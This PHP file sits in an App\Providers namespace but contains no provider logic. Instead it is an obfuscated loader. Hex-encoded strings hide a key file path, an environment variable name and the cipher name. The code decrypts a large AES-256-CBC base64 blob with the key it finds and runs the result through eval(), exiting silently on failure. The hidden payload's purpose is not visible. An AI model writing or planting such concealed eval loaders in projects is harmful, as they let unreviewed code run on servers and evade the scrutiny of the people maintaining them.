<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('dFhFYdZVmUfejXRJaI+FKA==');

$c=base64_decode(

'vVCD/y21n3a8+rqsa9ZdRpwOHyrEvZslm/FtVi7g57vKWwFVc1N7dYofIXz87FmKpxbjbxMPqQRJ' .
'eTJHRyOQiy9aICNiyjuXZwWR8vs+KTNZEaW7A/mMNuVz6Of05v46lNngFfd8DcZBnH4l47IfHLjK' .
'9rMbP3uAJDew90ikWsBZgwGqGAszyy4c99xufgBbV3eQ4N/CtP6sfGDai1P5mTqV0/Z8LhjX5v6r' .
'eV34YmohDDdckAYA2Q88r1tFJlcqaN7YoXBzVp7xYfvnTFyv4BHsYpUypTnrdW3F3I7eH3UiMcLY' .
'opfYWqMwAKYz2R/i85uj/lI+NacLQSgVcxnbPey6ZqrMpXk0/WCMkuxgqTbwyMFIX9nl1bd1cGnM' .
'iQCWOIe/LT534dKzqgC8kOzl6k9eLQS02P05UeOH0t7L0IdOqw6e3+FyXF3yrKE4Umh13XvcGJ6u' .
'VWpynsJJR0uI1SsPSEoUtTb6LuifHrWaUDKIB0Z04MBy/cRs4LR/Fsutp6dH1Z1b3Pt/iWGhQk7h' .
'nChR+e3ROml2y3l0sRAILqy+CBE9slnoulTU3CphzobOQT3wlwT+GuH3DWh/EwuMZxDg84/beH7y' .
'AgIBN9Sp6PQYnyBfxN17dNAeQPvlry5WDuUVskP17m9eQXxoB4bjzdgOhB1gm2FUEW1wj9sHM3fa' .
'6DZpyQYv0trZgHJxJ4MLuGtkSKe3eepYH1tx9iUA9cl4xAYAUiDvwys/pVa61GMLtLCKu7C5I5+R' .
'DSa9vyHbFssMWxdS8J158a/JlT2Pzl1GCmexpfaZvRchdaaIYRuJkm3t5ijWXsdwzhlZIYtvScCf' .
'qSjOaztt/sc9Mc4CXbR6RWM8wv5wP1Lxzf8wzJWYhaiv8p6ZNet/X9kPhh5dToBbsD2J6Cq8ZEPw' .
'MoJwzIsNH1wuq9HXU9aVYV/dROZTrIKhpk5sOavCC9M5RnelNSHDv8SbNXmuw696mTrNszEixCGw' .
'klPBVG1t+bSzM1Rq1r8stGOW2AXk3yjFSOsDjMLWvij5YgZ1cndOyIbFZmUrNZT61+vhygzz2h1W' .
'DhBfVRrAIyv7/LDfsYrVV6FpwMDiM9GQevQkFHgT0/B6nnGjb0sZKpXurU0P++Mcb03X3dxCMVWh' .
'nvX0Dwux9RQInrtsmJo3o6VtyMe9nMNjF6jBrzm/+oh3Jbcy5mRhEKi611Q9eShsTOtXeFXfnf8i' .
'66Hd1SV25wsRU3SiEU2tzhEknSs9vFQCEx5Kr0uROxsnQgRDBVEtUIdL8CPo6nQTtFHuAU8auij2' .
'1s7LpA0Pu/dHtS49Zv04uE43UKIHmclogYmxWNHupqxJ/le8aY3i4KKSfHEaY3uYK8g9qAMCsUTq' .
'eHD1LOAooH0wh4Ocxqm38NOhr9xX2bI2KYZy10jSMhw0MUC8Z19wznP/Dd2ANQm+jhveyWB2YVjp' .
'meNZKQ6Qoypui6MOCR+9o/9jMilSId8SRXhumSJoEZc1NEhXpOqxumv5wPdSE48CLrucYzfvhCKX' .
'ai48dCGeVhylLROatrTDdr9s/f/yFrnRd+m3+9jvV5C5QoFN43pbHJ68tFbfs/A3QtLWcDDwyhsv' .
'gO4euIO8vXC8J7+ef77DEkQU5vF7qPMW3XCeZsBghiRjUjs='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

